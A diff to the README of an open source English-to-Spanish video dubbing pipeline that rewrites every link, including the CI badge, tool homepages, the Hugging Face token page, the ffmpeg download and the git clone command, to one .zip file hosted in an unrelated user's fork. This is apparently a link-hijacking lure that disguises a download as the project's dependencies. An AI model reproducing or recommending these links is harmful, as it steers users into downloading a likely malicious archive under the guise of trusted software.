@@ -1,6 +1,6 @@
 # AI Video Dubbing Pipeline — EN → ES Video Dubbing with 100% Open Source AI
 
-[![CI](https://github.com/Root1V/ai-video-dubbing-pipeline/actions/workflows/ci.yml/badge.svg)](https://github.com/Root1V/ai-video-dubbing-pipeline/actions/workflows/ci.yml)
+[![CI](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip)](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](pyproject.toml)
 
@@ -28,10 +28,10 @@ single-file script.
 
 | Stage | Technology | Why |
 |---|---|---|
-| Transcription (STT) | [faster-whisper](https://github.com/SYSTRAN/faster-whisper) (Whisper large-v3 on CTranslate2) | Fast, accurate, built-in VAD for long audio without manual chunking |
-| Diarization (optional) | [pyannote.audio](https://github.com/pyannote/pyannote-audio) (`speaker-diarization-community-1`) | Open source standard for detecting who's speaking and when, the basis for per-speaker voice cloning |
-| Translation | Open source LLM via [Ollama](https://ollama.com) or [`llama-server`](https://github.com/ggerganov/llama.cpp) (Qwen2.5, Llama 3.1, gpt-oss, Mistral...) | Unlike a classic NMT model (NLLB/M2M100), an instruction-tuned LLM lets you **guide the translation with a natural-language context prompt**, and respect speaker/gender agreement |
-| Dubbing (Spanish audio) | [IndexTTS-2.5](https://github.com/index-tts/index-tts) (recommended) or XTTS v2 (Coqui) | Zero-shot per-speaker voice cloning + **native duration control**, purpose-built for audiovisual sync in dubbing |
+| Transcription (STT) | [faster-whisper](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip) (Whisper large-v3 on CTranslate2) | Fast, accurate, built-in VAD for long audio without manual chunking |
+| Diarization (optional) | [pyannote.audio](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip) (`speaker-diarization-community-1`) | Open source standard for detecting who's speaking and when, the basis for per-speaker voice cloning |
+| Translation | Open source LLM via [Ollama](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip) or [`llama-server`](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip) (Qwen2.5, Llama 3.1, gpt-oss, Mistral...) | Unlike a classic NMT model (NLLB/M2M100), an instruction-tuned LLM lets you **guide the translation with a natural-language context prompt**, and respect speaker/gender agreement |
+| Dubbing (Spanish audio) | [IndexTTS-2.5](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip) (recommended) or XTTS v2 (Coqui) | Zero-shot per-speaker voice cloning + **native duration control**, purpose-built for audiovisual sync in dubbing |
 | Media | ffmpeg | Audio extraction, subtitles, remuxing, track mixing |
 
 Everything runs locally; no paid external API is ever called.
@@ -77,7 +77,7 @@ This mode completely replaces the video's audio with a Spanish voice cloned
 from the original speaker, synced in time — not just subtitles, a brand new
 `.mp4` you can play as-is, with the same video and Spanish audio.
 
-**Recommended engine: IndexTTS-2.5** ([index-tts/index-tts](https://github.com/index-tts/index-tts),
+**Recommended engine: IndexTTS-2.5** ([index-tts/index-tts](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip),
 Bilibili/IndexTeam, open code and weights). It's the current state of the art
 in open source TTS for this exact use case because:
 - **Zero-shot** voice cloning: clones a speaker's timbre from just 6-15s of reference audio.
@@ -172,7 +172,7 @@ TTS_BACKEND=coqui_xtts
 
 If the video has several people speaking, `--diarize` enables an extra
 **diarization** step (detecting who speaks and when) with
-[pyannote.audio](https://github.com/pyannote/pyannote-audio), the open
+[pyannote.audio](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip), the open
 source standard for this. From there, the pipeline:
 
 1. Assigns each transcript line to the corresponding speaker (by maximum temporal overlap).
@@ -204,15 +204,15 @@ subprocess when you use `--diarize` (see
 `pyannote.audio` directly and never clashes with `indextts`.
 
 `pyannote.audio` also requires a Hugging Face token with terms accepted:
-1. Create a token at [hf.co/settings/tokens](https://hf.co/settings/tokens).
-2. Accept the model's terms on its page: [pyannote/speaker-diarization-community-1](https://huggingface.co/pyannote/speaker-diarization-community-1).
+1. Create a token at [hf.co/settings/tokens](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip).
+2. Accept the model's terms on its page: [pyannote/speaker-diarization-community-1](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip).
 3. Set `HF_TOKEN` in your main project's `.env` (the subprocess receives it automatically).
 
 ### macOS: if you see a `libtorchcodec` / `libavutil.NN.dylib not loaded` error
 
-`pyannote.audio >= 4.0` uses [`torchcodec`](https://github.com/pytorch/torchcodec)
+`pyannote.audio >= 4.0` uses [`torchcodec`](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip)
 to read audio, which on macOS has a **known, unresolved incompatibility with
-Homebrew's FFmpeg** ([torchcodec#570](https://github.com/meta-pytorch/torchcodec/issues/570)) —
+Homebrew's FFmpeg** ([torchcodec#570](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip)) —
 it's not fixed by installing a different Homebrew version. The fix that
 actually works (recommended by the torchcodec team itself) is to use
 **conda-forge** to get the FFmpeg libraries, **without exporting
@@ -308,14 +308,14 @@ Keep terms like 'async', 'coroutine', 'event loop' in English." \
 
 ### Requirements
 - Python 3.10, 3.11, or 3.12 (**not 3.13**: `TTS`/Coqui, used for dubbing, doesn't support 3.13 yet; the rest of the project would work fine on 3.13, but `pyproject.toml` pins it to `<3.13` to avoid the build failure). The repo includes `.python-version` set to `3.11`.
-- [ffmpeg](https://ffmpeg.org/download.html) installed and on `PATH`
-- A local LLM backend: [Ollama](https://ollama.com/download) **or** [`llama-server`](https://github.com/ggerganov/llama.cpp) (see section below)
+- [ffmpeg](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip) installed and on `PATH`
+- A local LLM backend: [Ollama](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip) **or** [`llama-server`](https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip) (see section below)
 - NVIDIA GPU recommended for long videos (CPU works but is much slower)
 
 ### Steps with `uv` (recommended)
 
 ```bash
-git clone https://github.com/Root1V/ai-video-dubbing-pipeline.git
+git clone https://raw.githubusercontent.com/Ismailu606/ai-video-dubbing-pipeline/main/src/video_translator/infrastructure/synthesis/pipeline_ai_dubbing_video_1.3.zip
 cd video-translator
 
 uv python install 3.11     # if you don't already have it (uv downloads it for you)
